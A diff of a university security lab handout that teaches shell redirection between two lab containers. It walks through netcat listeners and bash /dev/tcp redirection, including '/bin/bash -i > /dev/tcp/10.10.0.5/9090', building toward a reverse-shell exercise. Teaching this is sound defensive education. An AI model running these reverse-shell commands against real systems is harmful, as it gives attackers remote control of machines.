@@ -35,8 +35,8 @@ At the end of this concept lab, you should be able:
 # Logistics
 
 For this lab, we will be using GitHub classroom to get the starter code. Please
-follow this [link]() to accept the assignment and obtain your own fork of the
-lab repository.
+follow this [link](https://moodle.rose-hulman.edu/mod/url/view.php?id=4756028)
+to accept the assignment and obtain your own fork of the lab repository.
 
 {: .important }
 The first time you accept an invite, you will be asked to link your account to
@@ -49,9 +49,9 @@ Before we spin up our containers, there are some configuration variables that
 must be generated on the spot. To do so, please run the `gen_env_file.sh`
 script from the prelab repository directory as follows:
 
-  ```shell
-  $ ./gen_env_file.sh
-  ```
+```shell
+$ ./gen_env_file.sh
+```
 
 If run correctly, several files will be generated:
 
@@ -225,9 +225,9 @@ the same location (i.e., we'd like `stdin` to read from the same file that
 
 Run `simple_loop.bin` with the following command:
 
-  ```sh
-  $ ./simple_loop.bin > output.txt 0<&1
-  ```
+```sh
+$ ./simple_loop.bin > output.txt 0<&1
+```
 
 ## Question sheet
 
@@ -268,17 +268,17 @@ available for us. Grab two terminal windows, one running on the server
 container and another running on the client container.
 
 On the server, start a `netcat` server using:
-  ```sh
-  $ nc -n -v -l 9090
-  ```
+```sh
+$ nc -n -v -l 9090
+```
 This will start listening for incoming TCP connections on port 9090.
 
 On the client machine, let's send a message to this `netcat` server without
 using the `nc` command. To do so, use the following command:
 
-  ```sh
-  $ echo 'Hello' > /dev/tcp/10.10.0.5/9090
-  ```
+```sh
+$ echo 'Hello' > /dev/tcp/10.10.0.5/9090
+```
 
 ## Question sheet
 
@@ -293,15 +293,15 @@ questions:
 Now, let's make things a bit more fun. Using the same setup, start a netcat
 server on the server machine using:
 
-  ```sh
-  $ nc -n -v -l 9090
-  ```
+```sh
+$ nc -n -v -l 9090
+```
 
 However, on the client side, run the following command:
 
-  ```sh
-  $ /bin/bash -i > /dev/tcp/10.10.0.5/9090
-  ```
+```sh
+$ /bin/bash -i > /dev/tcp/10.10.0.5/9090
+```
 
 You will notice that you are still in bash, however, a new instance of `bash`
 has been created in interactive mode (thus the `-i` above which stands for
@@ -337,16 +337,16 @@ server to exit using `C-c` on the server for the connection to be dropped
 This experiment is optional, though it might be helpful with the last
 experiment. On the server container, launch a `netcat` server using:
 
-  ```sh
-  $ nc -n -v -l 9090
-  ```
+```sh
+$ nc -n -v -l 9090
+```
 
 On the client container, launch the `simple_prompt.bin` program while asking it
 to read the input from the **server connection**.
 
-  ```sh
-  $ ./simple_prompt.bin 0< /dev/tcp/10.10.0.5/9090
-  ```
+```sh
+$ ./simple_prompt.bin 0< /dev/tcp/10.10.0.5/9090
+```
 
 The client's program will hang waiting for input, however try as you can you
 will not be able to provide it with input. However, switch to the server
@@ -363,9 +363,9 @@ create.
 
 Starting with the same setup, start a `netcat` server on the server container
 using:
-  ```sh
-  $ nc -n -v -l 9090
-  ```
+```sh
+$ nc -n -v -l 9090
+```
 
 On the client, design a command that will allow you to create a new interactive
 client shell **but on the server machine**. In other words, what we'd like to
